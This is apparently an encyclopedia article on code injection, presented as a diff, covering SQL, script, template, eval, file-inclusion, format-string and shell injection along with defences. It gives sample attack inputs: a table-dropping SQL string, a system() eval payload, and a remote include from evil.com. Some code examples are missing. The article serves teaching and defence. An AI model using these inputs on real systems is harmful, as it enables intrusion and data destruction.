@@ -1,0 +1,120 @@
+Code injection is the exploitation of a computer bug that is caused by processing invalid data. The injection is used by an attacker to introduce (or "inject") code into a vulnerable computer program and change the course of execution. The result of successful code injection can be disastrous, for example, by allowing computer viruses or computer worms to propagate.
+Code injection vulnerabilities occur when an application sends untrusted data to an interpreter. Injection flaws are most often found in SQL, LDAP, XPath, NoSQL queries, OS commands, XML parsers, SMTP headers, program arguments, etc. Injection flaws tend to be easier to discover when examining source code than via testing. Scanners and fuzzers can help find injection flaws.Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover.
+Certain types of code injection are errors in interpretation, giving special meaning to user input. Similar interpretation errors exist outside the world of computer science such as the comedy routine Who's on First?. In the routine, there is a failure to distinguish proper names from regular words. Likewise, in some types of code injection, there is a failure to distinguish user input from system commands.
+Code injection techniques are popular in system hacking or cracking to gain information, privilege escalation or unauthorized access to a system. Code injection can be used malevolently for many purposes, including:
+
+Arbitrarily modifying values in a database through SQL injection. The impact of this can range from website defacement to serious compromise of sensitive data.
+Installing malware or executing malevolent code on a server by injecting server scripting code (such as PHP or ASP).
+Privilege escalation to root permissions by exploiting Shell Injection vulnerabilities in a setuid root binary on UNIX, or Local System by exploiting a service on Microsoft Windows.
+Attacking web users with HTML/script injection (Cross-site scripting).Code Injection attacks in Internet of Things could also lead to severe consequences like data breaches and service disruption.In 2008, 5.66% of all vulnerabilities reported that year were classified as Code Injection, the highest year on record. In 2015, this had decreased to 0.77%.
+
+Benign and unintentional use
+Code injection may be used with good intentions; for example, changing or tweaking the behavior of a program or system through code injection can cause the system to behave in a certain way without any malicious intent. Code injection could, for example:
+
+Introduce a useful new column that did not appear in the original design of a search results page.
+Offer a new way to filter, order, or group data by using a field not exposed in the default functions of the original design.
+As regards programs like Dropbox, add special parts that could be used to connect to online resources in an offline program.
+Utilize the Linux Dynamic Linker to define a function with the same name as certain libc functions, link that function as a library, and override the use of the libc function.Some users may unsuspectingly perform code injection because input they provide to a program was not considered by those who originally developed the system. For example:
+
+What the user may consider a valid input may contain token characters or character strings that have been reserved by the developer to have special meaning (perhaps the "&" in "Shannon & Jason," or quotation marks as in "Bub 'Slugger' McCracken").
+The user may submit a malformed file as input that is handled gracefully in one application, but is toxic to the receiving system.Another benign use of code injection could be the discovery of injection flaws themselves, with the intention of fixing these flaws.  This is known as a white hat penetration test.
+
+Preventing problems
+To prevent code injection problems, utilize secure input and output handling, such as:
+
+Using APIs that, if used properly, are secure against all input characters. Parameterized queries (also known as "Compiled queries", "prepared statements", "bound variables") allows for moving user data out of string to be interpreted. Additionally Criteria API and similar APIs move away from the concept of command strings to be created and interpreted.
+Enforcing language separation via a static type system.
+Input validation, such as whitelisting only known good values, this can be done on client side using JavaScript for example or it can be done on the server side which is more secure.
+Input encoding, e.g. escaping dangerous characters.  For instance, in PHP, using the htmlspecialchars() function to escape special characters for safe output of text in HTML, and mysqli::real_escape_string() to isolate data which will be included in an SQL request, to protect against SQL Injection.
+Output encoding, i.e. preventing HTML Injection (XSS) attacks against web site visitors
+HttpOnly is a flag for HTTP Cookies that, when set, does not allow client-side script interaction with cookies, thereby preventing certain XSS attacks.
+Modular shell disassociation from kernel
+With SQL Injection, one can use parameterized queries, stored procedures, whitelist input validation, and more to help mitigate Code Injection problems.The solutions listed above deal primarily with web-based injection of HTML or script code into a server-side application. Other approaches must be taken, however, when dealing with injection of user code on the user machine, resulting in privilege elevation attacks. Some approaches that are used to detect and isolate managed and unmanaged code injections are:
+
+Runtime image hash validation – capture a hash of a part or complete image of the executable loaded into memory, and compare it with stored and expected hash.
+NX bit – all user data is stored in a special memory sections that are marked as non-executable.  The processor is made aware that no code exists in that part of memory, and refuses to execute anything found in there.
+Canaries – randomly place values in a stack. At runtime, a canary is checked when a function returns.  If a canary has been modified, the program stops execution and exits.  This occurs on a Stack Overflow Attack.
+[In C]Code Pointer Masking (CPM) – after loading a (potentially changed) code pointer into a register, apply a bitmask to the pointer. This effectively restricts the addresses to which the pointer can refer.
+
+Examples
+SQL injection
+SQL injection takes advantage of the syntax of SQL to inject malicious commands that can read or modify a database, or compromise the meaning of the original query.For example, consider a web page that has two fields to allow users to enter a user name and a password. The code behind the page will generate a SQL query to check the password against the list of user names:
+
+If this query returns any rows, then access is granted. However, if the malicious user enters a valid Username and injects some valid code (password' OR '1'='1) in the Password field, then the resulting query will look like this:
+
+In the example above, "Password" is assumed to be blank or some innocuous string. "'1'='1'" will always be true and many rows will be returned, thereby allowing access.
+The technique may be refined to allow multiple statements to run, or even to load up and run external programs.
+
+Assume a query with the following format:If an adversary has the following for inputs:
+UserID: ';DROP TABLE User; --'
+Password: 'OR"='
+
+the query will be parsed to be:
+The result is that the table User will be removed from the database.  This occurs because the ; symbol signifies the end of one command and the start of a new one.   -- signifies the start of a comment.
+
+Cross-site scripting
+Code injection is the malicious injection or introduction of code into an application. Some web servers have a guestbook script, which accepts small messages from users, and typically receives messages such as:
+
+Very nice site!
+
+However a malicious person may know of a code injection vulnerability in the guestbook, and enters a message such as:
+
+If another user views the page then the injected code will be executed.  This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.
+HTML and script injection is a popular subject, commonly termed "cross-site scripting" or "XSS". XSS refers to an injection flaw whereby user input to a web script or something along such lines is placed into the output HTML, without being checked for HTML code or scripting.
+Many of these problems are related to erroneous assumptions of what input data is possible, or the effects of special data.
+
+Server Side Template Injection
+Template engines  are often used in modern Web application to display dynamic data. However, trusting non validated user data can frequently lead to critical vulnerabilities such as Server Side Template Injections. While this vulnerability is similar to Cross-site scripting, template injection can be leverage to execute code on the web server rather than in a visitor's browser. It abuses a common workflow of web applications which often use user inputs and templates to render a web page. The example below shows the concept. Here the template {{visitor_name}} is replaced with data during the rendering process.An attacker can use this workflow to inject code into the rendering pipeline by providing a malicious visitor_name. Depending on the implementation of the web application, he could choose to inject {{7*'7'}} which the renderer could resolve to Hello 7777777. Note that the actual web server has evaluated the malicious code and therefore could be vulnerable to Remote code execution.
+
+Dynamic evaluation vulnerabilities
+An eval() injection vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function
+call.
+
+The argument of "eval" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "10; system('/bin/echo uh-oh')", additional code is run which executes a program on the server, in this case "/bin/echo".
+
+Object injection
+PHP allows serialization and deserialization of whole objects. If untrusted input is allowed into the deserialization function, it is possible to overwrite existing classes in the program and execute malicious attacks. Such an attack on Joomla was found in 2013.
+
+Remote file injection
+Consider this PHP program (which includes a file specified by request):
+
+The example might be read as only color-files like blue.php and red.php could be loaded, while attackers might provide COLOR=http://evil.com/exploit causing PHP to load the external file.
+
+Format specifier injection
+Format string bugs most commonly appear when a programmer wishes to print a string containing user supplied data. The programmer may mistakenly write printf(buffer) instead of printf("%s", buffer).  The first version interprets buffer as a format string, and parses any formatting instructions it may contain. The second version simply prints a string to the screen, as the programmer intended.
+Consider the following short C program that has a local variable char array password which holds a password; the program asks the user for an integer and a string, then echoes out the user-provided string.If the user input is filled with a list of format specifiers such as %s%s%s%s%s%s%s%s , then printf()will start reading from the stack.  Eventually, one of the %s format specifier will access the address of password , which is on the stack, and print Password1 to the screen.
+
+Shell injection
+Shell injection (or command injection) is named after Unix shells, but applies to most systems which allow software to programmatically execute a command line.  Here is an example vulnerable tcsh script:
+
+If the above is stored in the executable file ./check, the shell command ./check " 1 ) evil" will attempt to execute the injected shell command evil instead of comparing the argument with the constant one.  Here, the code under attack is the code that is trying to check the parameter, the very code that might have been trying to validate the parameter in order to defend against an attack.Any function that can be used to compose and run a shell command is a potential vehicle for launching a shell injection attack.  Among these are system(), StartProcess(), and System.Diagnostics.Process.Start().
+Client–server systems such as web browser interaction with web servers are potentially vulnerable to shell injection.  Consider the following short PHP program that can run on a web server to run an external program called funnytext to replace a word the user sent with some other word.
+
+The passthru in the above composes a shell command that is then executed by the web server.  Since part of the command it composes is taken from the URL provided by the web browser, this allows the URL to inject malicious shell commands.  One can inject code into this program in several ways by exploiting the syntax of various shell features (this list is not exhaustive):
+Some languages offer functions to properly escape or quote strings that are used to construct shell commands:
+
+PHP: escapeshellarg() and escapeshellcmd()
+Python: shlex.quote()However, this still puts the burden on programmers to know/learn about these functions and to remember to make use of them every time they use shell commands. In addition to using these functions, validating or sanitizing the user input is also recommended.
+A safer alternative is to use APIs that execute external programs directly, rather than through a shell, thus preventing the possibility of shell injection. However, these APIs tend to not support various convenience features of shells, and/or to be more cumbersome/verbose compared to concise shell-syntax.
+
+See also
+Arbitrary code execution
+Buffer overflow
+Debugging
+File inclusion vulnerability
+Gadget (machine instruction sequence)
+Mobile code
+Machine code monitor
+Prompt injection
+SGML entity
+Shellshock (software bug)
+SQL injection
+Trojan horse (computing)
+Unintended instructions
+Web skimming
+
+References
+External links
+Article "Defending against Injection Attacks through Context-Sensitive String Evaluation (CSSE)" by Tadeusz Pietraszek and Chris Vanden Berghe
+News article "Flux spreads wider" - First Trojan horse to make use of code injection to prevent detection from a firewall
+The Daily WTF regularly reports real-world incidences of susceptibility to code injection in software.
